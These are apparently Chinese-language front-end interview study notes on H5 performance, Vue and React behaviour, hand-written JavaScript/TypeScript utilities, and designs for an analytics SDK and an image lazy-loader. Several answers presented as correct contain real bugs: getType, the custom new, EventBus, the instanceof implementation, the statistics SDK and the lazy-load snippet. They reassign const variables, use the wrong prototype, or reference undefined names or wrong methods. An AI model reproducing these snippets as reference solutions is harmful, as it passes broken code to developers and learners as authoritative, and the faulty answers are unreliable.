## 工作经验

### h5首屏优化

1. 路由懒加载：适用SPA，路由拆分，优先保证首页加载
2. 服务端渲染SSR：如果是纯h5页面，SSR是性能优化的终极方案
3. App预取：如果h5再App WebView中展示，可使用App预取。即h5的数据是从app中获取的
4. 分页：针对列表页
5. 图片懒加载：针对详情页，注意：提前设置好尺寸，尽量不重排
6. hybrid：通过app提前下载好html，js，css文件，再通过file://协议打开本地已下载好的html

### 后端一次性返回10w条数据，该如何渲染？

一次性返回10w条肯定不合理，必须分页。



如果非要一次性渲染10w条数据，解决方案如下：

1. 自己搭建nodejs中间层，10w数据通过中间层处理
2. 虚拟列表：只渲染可视区域的DOM，其他隐藏区域只用div撑起高度，随着浏览器滚动，创建和销毁DOM。借用第三方lib，Vue-virtual-scroll-list和React-virtualiszed

### 常用设计模式，并说明场景

1. 工厂模式：用工厂函数来创建实例，隐藏new

2. 单例模式

3. 代理模式：使用者不能直接访问对象，而是访问一个代理层，在代理曾监听get set做很多事情。如vue3响应式

4. 发布订阅

   ```js
   const fn1 = () => {
   	//事件1
   }
   const fn2 = () => {
   	//事件2
   }
   // 绑定
   event.on('event-key', fn1)
   event.on('event-key', fn2)
   // 触发
   event.emit('event-key')
   
   // beforeUnmount时解除,防止内存泄漏
   event.off('event-key', fn1)
   event.off('event-key', fn2)
   ```

5. 观察者模式
6. 装饰器模式

观察者模式和发布订阅的区别：观察者模式是监听事件，自动触发；发布订阅模式要手动发布

### 工作中做过哪些Vue优化

1. v-for使用key，key不能是index，用id
2. v-if和v-show多用v-if，除非频繁切换
3. 多用computed缓存
4. 频繁切换组件用keep-alive
5. 针对体积较大的组件，如编辑器、复杂表格、复杂表单等，用异步组件；这样可以拆包，减少主包体积
6. 路由懒加载

### 使用Vue遇到过哪些坑？

1. 内存泄漏：定义的全局变量，全局事件，全局定时器，自定义事件没有销毁
2. data新增属性需要用$set()，无法通过索引直接新增数组的item
3. 路由切换时，scroll到顶部。解决：1.缓存列表页数据和scrollTop值；2.终极方案MPA+webview

### 如何统一监听Vue组件报错

window.onerror是全局监听所有js报错，但它是js级别的，识别不到Vue组件信息

```js
window.onerror = function (msg, source, line, column,error) {
	console.info('window.onerror----', msg, source, line,column, error)
}
```

errorCaptured: 监听所有下级组件的错误，返回false会阻止向上传播

```vue
// app.vue
<script>
	export default{
        errorCaptured(err, vm, info){
            console.info('errorCaptured----', err, vm, info)
            return false // 这样errorCaptured和window.onerror就不会重复触发
        }
    }
</script>
```

errorHandler一般在app.js中配置，监听全局Vue组件报错，在app.js中配置了errorHandler就不会再触发window.onerror了

```js
app.config.errorHandler = (err, vm, info) => {
	console.info('errorCaptured----', err, vm, info)
}
```

异步错误即回调函数中的错误，errorHandler监听不到，需要用window.onerror

### 如果一个H5很慢，你该如何排查性能问题？

前端性能指标：

- First Paint（FP）：第一次渲染
- First Contentful Paint（FCP）：第一次有内容的渲染
- DOMContentLoaded（DCL）：DOM加载完用的时间
- Largest Contentful Paint（LCP）：页面最大的部分渲染完成的时间
- Loaded：页面渲染完成

控制台network打开showoverview

perfermance查看timings性能指标的时间和network的资源加载时间

first paint之前的时间是页面加载时间，之后的时间是页面渲染时间，看是加载时间长还是渲染时间长。



Lighthouse第三方性能评测工具，根据评测结果的建议来优化

使用方式：

- npm i lighthouse -g
- lighthouse http://www.imooc.com/ --view --preset=desktop：用lighthouse来评测目标网址，--view表示要查看性能评测报告，--preset=desktop表示用pc的方式去访问报告



解决：

- 如果是网页加载慢
  - 优化服务器硬件配置，使用CDN
  - 路由懒加载，大组件异步加载
  - 优化HTTP缓存策略
- 如果是网页渲染慢
  - 优化服务端接口（如ajax获取数据慢）
  - 继续分析，优化前端组件内部逻辑

性能优化需要持续跟进，可使用第三方统计服务，如阿里云ARMS，百度统计

## 高质量代码

### 实现数组扁平化

```typescript
function flatten(arr: any[]): any[]{
    const res: any[] = []
    
    arr.forEach(item => {
        if (Array.isArray(item)) {
            res.push(...flatten(item))
        } else {
            res.push(item)
        }
    })
    
    return res
}
```

### 手写一个getType函数，传入任意变量，获取数据类型

```typescript
function getType(x: any):string{
	const originType = Object.prototype.toString().call(x)
    const originIndex = originType.indexOf(' ')
    const type = originType.slice(originIndex + 1, -1)
    
    return type.toLowerCase()
}
```

### 手写new

```typescript
function customNew<T>(constructor: Function, ...args: any[]): T{
	// 1. 创建一个空对象，继承constructor的原型
    const obj = Object.create(constructor)
    // 2. 将obj的作为this，执行constructor，传入参数
    constructor.apply(obj, args)
    // 3. 返回新创建的对象
    return obj
}
```

### 深度遍历和广度遍历一颗DOM树

```typescript
// 深度优先遍历
/**
 * 访问节点
 * @param n node
 */
function visitNode(n: Node) {
    if (n instanceof Comment) {
        // 注释
        console.info('Comment node ---', n.textContent)
    }
    if (n instanceof Text) {
        // 文本
        const t = n.textContent?.trim()
        if (t) {
            console.info('Text node ---', t)
        }
    }
    if (n instanceof HTMLElement) {
        // element
        console.info('Element node ---', `<${n.tagName.toLowerCase()}>`)
    }
}

/**
 * 深度优先遍历
 * @param root dom node
 */
function depthFirstTraverse1(root: Node) {
    visitNode(root)

    const childNodes = root.childNodes // .childNodes 和 .children 不一样
    if (childNodes.length) {
        childNodes.forEach(child => {
            depthFirstTraverse1(child) // 递归
        })
    }
}

/**
 * 深度优先遍历 不用递归，用栈（递归的本质就是栈）
 * @param root dom node
 */
 function depthFirstTraverse2(root: Node) {
     const stack: Node[] = []

     // 根节点压栈
     stack.push(root)

     while (stack.length > 0) {
         const curNode = stack.pop() // 出栈
         if (curNode == null) break

         visitNode(curNode)

         // 子节点压栈
         const childNodes = curNode.childNodes
         if (childNodes.length > 0) {
             // reverse 反顺序压栈
             Array.from(childNodes).reverse().forEach(child => stack.push(child))
         }
     }
 }
```

```typescript
/**
 * 广度优先遍历
 * @param root dom node
 */
function breadthFirstTraverse(root: Node) {
    const queue: Node[] = [] // 数组 vs 链表

    // 根节点入队列
    queue.unshift(root)

    while (queue.length > 0) {
        const curNode = queue.pop()
        if (curNode == null) break

        visitNode(curNode)

        // 子节点入队
        const childNodes = curNode.childNodes
        if (childNodes.length) {
            childNodes.forEach(child => queue.unshift(child))
        }
    }
}
```

###  手写EventBus事件总线

实现on once、emit、off

```typescript
class EventBus{
	private events: { [key: string]: Array<Function> } // { key1: [fn1, fn2], key2: [fn1, fn2] }
    private onceEvents: {[key: string]: Array<Function>}
    
    constructor() {
        this.events = {}
        this.onceEvents = {}
    }
    
    on(key: string, fn: Function) {
        const fnList = this.events[key]
        if (fnList === null) fnList = []
        
        fnList.push(fn)
    }
    
    once(key: string, fn: Function) {
        const onceFnList = this.onceEvents[key]
        if (onceFnList === null) onceFnList = []
        
        onceFnList.push(fn)
    }
    
    off(key: string, fn?: Function) {
        if (fn) {
            const fnList = this.events[key]
        	const onceFnList = this.onceEvents[key]
            if (fnList) {
                this.events[key] = fnList.filter(item => item !== fn)
            }
            if (onceFnList) {
                this.onceFnList[key] = onceFnList.filter(item => item !== fn)
            }
        } else {
            this.events[key] = []
            this.onceEvents[key] = []
        }
    }
    
    emit(key: string, ...args: any[]) {
        const fnList = this.events[key]
        const onceFnList = this.onceEvents[key]
        if (fnList) {
            fnList.forEach(item => item(...args))
        }
        if (onceFnList) {
            onceFnList.forEach(item => item(...args))
            this.onceEvents[key] = []
        }
    }
}
```

### 手写LazyMan

支持sleep和eat方法，支持链式调用

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302012142685.png)

```typescript
class LazyMan {
    private name: string
    private tasks: Function[] = [] // 任务列表

    constructor(name: string) {
        this.name = name

        setTimeout(() => {
            this.next()
        })
    }

    private next() {
        const task = this.tasks.shift() // 取出当前 tasks 的第一个任务
        if (task) task()
    }

    eat(food: string) {
        const task = () => {
            console.info(`${this.name} eat ${food}`)
            this.next() // 立刻执行下一个任务
        }
        this.tasks.push(task)

        return this // 链式调用
    }

    sleep(seconds: number) {
        const task = () => {
            console.info(`${this.name} 开始睡觉`)
            setTimeout(() => {
                console.info(`${this.name} 已经睡完了 ${seconds}s，开始执行下一个任务`)
                this.next() // xx 秒之后再执行下一个任务
            }, seconds * 1000)
        }
        this.tasks.push(task)

        return this // 链式调用
    }
}

const me = new LazyMan('双越')
me.eat('苹果').eat('香蕉').sleep(2).eat('葡萄').eat('西瓜').sleep(2).eat('橘子')
```

### 手写curry柯里化函数，把其他函数柯里化

```typescript
export function curry(fn: Function) {
    const fnArgsLength = fn.length // 传入函数的参数长度
    let args: any[] = []

    // ts 中，独立的函数，this 需要声明类型
    function calc(this: any, ...newArgs: any[]) {
        // 积累参数
        args = [
            ...args,
            ...newArgs
        ]
        if (args.length < fnArgsLength) {
            // 参数不够，返回函数
            return calc
        } else {
            // 参数够了，返回执行结果
            return fn.apply(this, args.slice(0, fnArgsLength))
        }
    }

    return calc
}

// function add(a: number, b: number, c: number): number {
//     return a + b + c
// }
// // add(10, 20, 30) // 60

// const curryAdd = curry(add)
// const res = curryAdd(10)(20)(30) // 60
// console.info(res)
```

### instanceof原理是什么，请用代码表示

```typescript
function myInstance(instance: any, origin: any): boolean{
	if (instance == null) return false // null undefined
    
    const type = typeof instance
    if (type !== 'object' && type !== 'function') {
        // 值类型，值类型调用instanceof都是false，如'123' instanceof String结果为false
        return false
    }
    
   	const tempInstance = instance // 防止修改instance值
    while(tempInstance) {
        if (tempInstance.__proto__ === origin) {
            return true
        }
        
        tempInstance = tempInstance.__proto__ // 顺着原型链网上找，直到原型为null，也就是object
    }
    
    return false
}
```

### 手写bind函数

- bind返回一个新函数，但不执行
- 绑定this和部分参数
- 如果是箭头函数，无法改变this

```typescript
// @ts-ignore
Function.prototype.customBind = function (context: any, ...bindArgs: any[]) {
    // context 是 bind 传入的 this
    // bindArgs 是 bind 传入的各个参数

    const self = this // 当前的函数本身

    return function (...args: any[]) {
        // 拼接参数
        const newArgs = bindArgs.concat(args)
        return self.apply(context, newArgs)
    }
}

// // 功能测试
// function fn(this: any, a: any, b: any, c: any) {
//     console.info(this, a, b, c)
// }
// // @ts-ignore
// const fn1 = fn.customBind({x: 100}, 10)
// fn1(20, 30) // {x: 100} 10 20 30
```

### 手写call和apply

实现原理：

- 如const obj = {x: 100,fn(){this.x}}
- 执行obj.fn()，此时fn内部的this指向obj

```typescript
// @ts-ignore
Function.prototype.customCall = function (context: any, ...args: any[]) {
    if (context == null) context = globalThis
    if (typeof context !== 'object') context = new Object(context) // 值类型，变为对象

    const fnKey = Symbol() // 不会出现属性名称的覆盖
    context[fnKey] = this // this 就是当前的函数

    const res = context[fnKey](...args) // 绑定了 this

    delete context[fnKey] // 清理掉 fn ，防止污染

    return res
}

// @ts-ignore
Function.prototype.customApply = function (context: any, args: any[] = []) {
    if (context == null) context = globalThis
    if (typeof context !== 'object') context = new Object(context) // 值类型，变为对象

    const fnKey = Symbol() // 不会出现属性名称的覆盖
    context[fnKey] = this // this 就是当前的函数

    const res = context[fnKey](...args) // 绑定了 this

    delete context[fnKey] // 清理掉 fn ，防止污染

    return res
}

function fn(this: any, a: any, b: any, c: any) {
    console.info(this, a, b, c)
}
// // @ts-ignore
// fn.customCall({x: 100}, 10, 20, 30)
// @ts-ignore
// fn.customApply({x: 200}, [100, 200, 300])
```

### 用JS实现LRU缓存

LRU-Least Recently Used最近使用：如果内存优先，之缓存最近使用的，删除沉水数据

核心API：get set



分析：

- 用哈希表存储数据，这样get set才够快O(1)
- 必须是有序的，常用数据放在前面，沉水数据放在后面
- 哈希表+有序，所以只有Map才符合

```typescript
export default class LRUCache {
    private length: number
    private data: Map<any, any> = new Map()

    constructor(length: number) {
        if (length < 1) throw new Error('invalid length')
        this.length = length
    }

    set(key: any, value: any) {
        const data = this.data

        if (data.has(key)) {
            data.delete(key)
        }
        data.set(key, value)

        if (data.size > this.length) {
            // 如果超出了容量，则删除 Map 最老的元素
            const delKey = data.keys().next().value
            data.delete(delKey)
        }
    }

    get(key: any): any {
        const data = this.data

        if (!data.has(key)) return null

        const value = data.get(key)

        data.delete(key)
        data.set(key, value)

        return value
    }
}

// const lruCache = new LRUCache(2)
// lruCache.set(1, 1) // {1=1}
// lruCache.set(2, 2) // {1=1, 2=2}
// console.info(lruCache.get(1)) // 1 {2=2, 1=1}
// lruCache.set(3, 3) // {1=1, 3=3}
// console.info(lruCache.get(2)) // null
// lruCache.set(4, 4) // {3=3, 4=4}
// console.info(lruCache.get(1)) // null
// console.info(lruCache.get(3)) // 3 {4=4, 3=3}
// console.info(lruCache.get(4)) // 4 {3=3, 4=4}
```

### 手写一个深拷贝函数，考虑Map，Set，循环引用

使用JSON.stringify和parse能实现一个最简单的深拷贝，但是无法转换函数、Map、Set，也无法转化循环引用

```typescript
/**
 * 深拷贝
 * @param obj obj
 * @param map weakmap 为了避免循环引用
 */
export function cloneDeep(obj: any, map = new WeakMap()): any {
    if (typeof obj !== 'object' || obj == null ) return obj

    // 避免循环引用
    const objFromMap = map.get(obj)
    if (objFromMap) return objFromMap

    let target: any = {}
    map.set(obj, target)

    // Map
    if (obj instanceof Map) {
        target = new Map()
        obj.forEach((v, k) => {
            const v1 = cloneDeep(v, map)
            const k1 = cloneDeep(k, map)
            target.set(k1, v1)
        })
    }

    // Set
    if (obj instanceof Set) {
        target = new Set()
        obj.forEach(v => {
            const v1 = cloneDeep(v, map)
            target.add(v1)
        })
    }

    // Array
    if (obj instanceof Array) {
        target = obj.map(item => cloneDeep(item, map))
    }

    // Object
    for (const key in obj) {
        const val = obj[key]
        const val1 = cloneDeep(val, map)
        target[key] = val1
    }

    return target
}

// // 功能测试
// const a: any = {
//     set: new Set([10, 20, 30]),
//     map: new Map([['x', 10], ['y', 20]]),
//     info: {
//         city: '北京'
//     },
//     fn: () => { console.info(100) }
// }
// a.self = a
// console.log( cloneDeep(a) )
```

## 分析解决问题

### ['1','2','3'].map(parseInt)

map函数会执行map的参数函数，且这个参数函数会接收几个参数currentValue[, index[, array]]，所以parseInt执行时接受到的参数时parseInt(value, index)

```js
['1','2','3'].map(parseInt)
// 等同于
['1','2','3'].map((value, index) => {
    return parseInt(value, index)
})
```

拆分开来就是：

1. value为'1'，index为0'；即parseInt('1', 0);radix为0相当于未指定，按10进制处理，所以结果是1
2. value为'2'，index为1；即parseInt('2', 1)；redux为1，不符合[2-36]的范围，所以结果是NaN
3. value为'3'，index为2；即parseInt('3', 2)；2进制中不存在数字3，所以结果是NaN

### 手写convert函数，将数组转为树

思路：

- 遍历数组
- 每个元素生成tree node
- 找到parentNode，将tree node插入到children中

```typescript
interface IArrayItem{
    id: number,
    name: string,
    parentId: number
}
interface ITreeNode{
    id: number,
    name: string,
    children?: []
}

function convert(arr: IArrayItem[]): ITreeNode | null {
    // 用于 id 和 treeNode 的映射
    const idToTreeNode: Map<number, ITreeNode> = new Map()

    let root = null

    arr.forEach(item => {
        const { id, name, parentId } = item

        // 定义 tree node 并加入 map
        const treeNode: ITreeNode = { id, name }
        idToTreeNode.set(id, treeNode)

        // 找到 parentNode 并加入到它的 children
        const parentNode = idToTreeNode.get(parentId)
        if (parentNode) {
            if (parentNode.children == null) parentNode.children = []
            parentNode.children.push(treeNode)
        }

        // 找到根节点
        if (parentId === 0) root = treeNode
    })

    return root
}

const arr = [
    { id: 1, name: '部门A', parentId: 0 }, // 0 代表顶级节点，无父节点
    { id: 2, name: '部门B', parentId: 1 },
    { id: 3, name: '部门C', parentId: 1 },
    { id: 4, name: '部门D', parentId: 2 },
    { id: 5, name: '部门E', parentId: 2 },
    { id: 6, name: '部门F', parentId: 3 },
]
const tree = convert(arr)
console.info(tree)
```

数组像关系型数据库，如mysql

树像文档型数据库，如mongodb

### 将树转为数组

思路：

- 遍历树节点（广度优先遍历）
- 将树节点转为Array Item，push到数组
- 根据父子关系，找到Array Item的parentId

```typescript
interface IArrayItem {
    id: number
    name: string
    parentId: number
}

interface ITreeNode {
    id: number
    name: string
    children?: ITreeNode[]
}

function convert1(root: ITreeNode): IArrayItem[] {
    // Map
    const nodeToParent: Map<ITreeNode, ITreeNode> = new Map()

    const arr: IArrayItem[] = []

    // 广度优先遍历，queue
    const queue: ITreeNode[] = []
    queue.unshift(root) // 根节点 入队

    while (queue.length > 0) {
        const curNode = queue.pop() // 出队
        if (curNode == null) break

        const { id, name, children = [] } = curNode

        // 创建数组 item 并 push
        const parentNode = nodeToParent.get(curNode)
        const parentId = parentNode?.id || 0
        const item = { id, name, parentId }
        arr.push(item)

        // 子节点入队
        children.forEach(child => {
            // 映射 parent
            nodeToParent.set(child, curNode)
            // 入队
            queue.unshift(child)
        })
    }

    return arr
}

const obj = {
    id: 1,
    name: '部门A',
    children: [
        {
            id: 2,
            name: '部门B',
            children: [
                { id: 4, name: '部门D' },
                { id: 5, name: '部门E' }
            ]
        },
        {
            id: 3,
            name: '部门C',
            children: [
                { id: 6, name: '部门F' }
            ]
        }
    ]
}
const arr1 = convert1(obj)
console.info(arr1)
```

### Promise-then执行顺序

如果有多个fulfilled promise实例，同时执行then链式调用，then会交替执行，这是编译器优化，防止一个promise占用太多时间

then中返回promise实例，相当于多出一个promise实例，也会遵守交替执行，但是会“慢2拍”

- 第一拍：promise需要由pending变为fulfilled
- 第二拍：then函数挂载到MicroTaskQueue

```js
Promise.resolve().then(() => {
    console.log(0)
    return Promise.resolve(4)
}).then((res) => {
    console.log(res)
})

Promise.resolve().then(() => {
    console.log(1)
}).then(() => {
    console.log(2)
}).then(() => {
    console.log(3)
}).then(() => {
    console.log(5)
}).then(() =>{
    console.log(6)
})

// then中返回promise实例，相当于执行如下操作
Promise.resolve().then(()=> {
    // 第一拍
    const p = Promise.resolve(100)
    Promise.resolve().then(() => {
        // 第二拍
        p.then(res => console.log(res))
        .then(() => {console.log(200)})
        .then(() => {console.log(300)})
        .then(() => {console.log(400)})
        .then(() => {console.log(500)})
        .then(() => {console.log(600)})
        .then(() => {console.log(700)})
    })
})
```

### React setState

setState默认是异步更新，不在React上下文中触发是同步更新

- 定时器，promise
- 自定义DOM事件
- ajax回调

```react
class Example extends React.Component {
    constructor() {
      super()
      this.state = {
        val: 0
      }
    }

    componentDidMount() {
      // // 传入函数，state 不会合并
      // this.setState((prevState, props) => {
      //   return { val: prevState.val + 1 }
      // })
      // this.setState((prevState, props) => {
      //   return { val: prevState.val + 1 }
      // })

      this.setState({val: this.state.val + 1})
      console.log('a----', this.state.val) // 0
  
      this.setState(
        {val: this.state.val + 20},
        () => { console.log('newVal: ' + this.state.val) }
      )
      console.log('b----', this.state.val) // 20
  
      setTimeout(() => {
        this.setState({val: this.state.val + 1})
        console.log('c----', this.state.val) // 21
  
        this.setState({val: this.state.val + 1})
        console.log('d----', this.state.val) // 22
      }, 0)

      // // 手动 DOM 事件同步更新，react的onclick这种事件异步更新
      // document.getElementById('p1').addEventListener('click', () => {
      //   this.setState({val: this.state.val + 1})
      //   console.log('e----', this.state.val)
      // })
    }
  
    render() {
      return <p id="p1">setState demo: {this.state.val}</p>
    }
}
```

### 对象和属性的连续赋值

```js
let a = {n: 1}
let b = a
a.x = a = {n: 2}

console.log(a.x) // undefined
console.log(b.x) // {n: 2}
```

a.x的优先级比赋值高，相当于

```js
a.x = undefined
let x = a.x
x = a = {n: 2}
```

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302031504112.png)

### 对象属性类型的问题

js对象key的数据类型：

- 只能是字符串和Symbol类型
- 其他类型都会被转化为字符串类型
- key类型转换为字符串会直接调用它的toString()方法

```js
let a = {}, b = '123', c = 123
a[b] = 'b'
a[c] = 'c'
console.log(a[b]) // 'c'

let a = {}, b = Symbol('123'), c = Symbol('123')
a[b] = 'b'
a[c] = 'c'
console.log(a[b]) // 'c' Symbol都是唯一的

let a = {}, b = {key: '123'}, c = {key: '456'}
a[b] = 'b'
a[c] = 'c'
console.log(a[b]) // 'c'，对象调用toString()结果是[Object 'object']
```

## 项目设计

### 如何设计一个前端统计SDK

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302032119234.png)

h5sdk将统计到的数据发送到服务端，服务端通过得到的数据分析出结果展示成数据看板，然后将结果发送给h5以让其实现优化

统计范围：

- PV：访问量
- 自定义事件：如升级为vip弹窗，统计点击确认和取消的量，或者点击分享的事件
- 性能和错误统计

```typescript
const PV_URL_SET = new Set()
class MyStatistic{
    constructor(productId){
        this.productId = productId // 可能有多个产品，所以需要记录产品编号
        this.initPerformance() // 需要在DOMContentLoaded之后执行
    }
    
    // 发送统计数据
    send(url, params={}) {
        params.productId = productId
        
        const paramArr = []
        for(let key in params) {
            const val = params[key]
            paramArr.push(`${key}=${value}`)
        }
        
        const newUrl = `${url}?${paramArr.join('&')}`
        
        // img可跨域，兼容性非常好
        const img = document.createElement('img')
        img.src = newUrl
        
    }
    
    // 初始化性能统计
    initPerformance() {
        const url = 'yyy'
        this.send(url, performance.timing)
    }
    
    // 初始化错误统计
    initError() {
        // window.onerror监听
        window.addEventListener('error', event => {
            const {error, lineno, colno} = event
            this.error(error, {lineno, colno})
        })
        // Promise中catch报的错
        window.addEventListener('unhandledrejection', event => {
            this.error(new Error(event.reason), {type: 'unhandledrejection'})
        })
    }
    
    // pv不能手动调用，因为SPA引用路由切换一次pv就增加一次，所以需要手动调用
    // pv就是一个特殊的event，但是event可以重复发送，pv不行
    pv() {
        const href = location.href
        if (PV_URL_SET.get(href)) return 
        this.event('pv')
        PV_URL_SET.add(href)
    }
    
    event(key, val) {
        const url = 'xxx'
        this.send(url, {key, val})
    }
    
    error(err, info) {
        // try catch里面的错误需要手动去触发
        // send
        const url = 'zzz'
        this.send(url, {err, ...info})
    }
}
const s = new MyStatistic()
s.pv()
s.event('vip', 'close')
```

### sourcemap的作用

js上线时要压缩、混淆，线上的js报错，将无法识别行、列；sourcemap可以将压缩、混淆之后的代码的报错信息转换成源码的报错信息

### 何时用SPA，何时用MPA

SPA特点：

- 功能较多，一个页面展示不完
- 以操作为主，非展示为主
- 适合一个综合Web应用

SPA场景：

- 大型后台管理系统
- 知识库
- 比较复杂的webapp

MPA特点：

- 功能较少，一个页面展示的完
- 以展示为主，操作较少
- 适合一个孤立的页面

MPA场景：

- 分享页
- 新闻页

### 如何设计一个用户-角色-权限的模型

RBAC：Role-based access control基于角色的访问控制

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302032220568.png)

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302032221346.png)

功能：

- 用户管理：增删改查，绑定角色
- 角色管理：增删改查，绑定权限
- 权限管理：增删改查

### 设计一个图片懒加载SDK

分析：

- 定义<img src="loading.png" data-src="xxx.png">
- 页面滚动，图片露出时，将data-src赋值给src
- 滚动要节流

获取图片定位：

- 图片元素位置ele.getBoundingClientRect()
- 图片的top和window.innerHeight视口高度对比，如果top大于视口高度，则图片未露出，小于则露出了

```js
function mapImagesAndTryLoad() {
	const images = document.querySelectorAll('img[data-src]') // 获取带有data-src属性的img标签
    const innerHeight = window.innerHeight
    
    images.forEach(item => {
        const rect = item.getBoundingClientRect()
        
        if (rect.top < innerHeight) {
            // 露出来了
            item.src = item['data-src']
            item.removeAttribute('data-src') // 移除data-src属性，为了下次执行更快
        }
    })
}

window.addEventListener('scroll', _.throttle(() => {
	mapImagesAndTryLoad()
}, 100))
mapImagesAndTryLoad()
```

## 软技能

### 日常学习

学习途径：看博客，视频，文档书籍

**浅层学习看输入，深层学习看输出**

### code review

- 看代码规范（eslint不能全检查，如变量命名、代码语义）
- 重复代码要抽离、复用
- 单个函数内容过长要拆分
- 算法复杂度是否可用？是否可以继续优化
- 是否有安全漏洞
- 扩展性如何？
- 是否和现有功能有重复？
- 是否有完善的单元测试？
- 组件设计是否合理？

**每次code review的问题要记录下来，归纳整理，形成自己的代码规范体系**


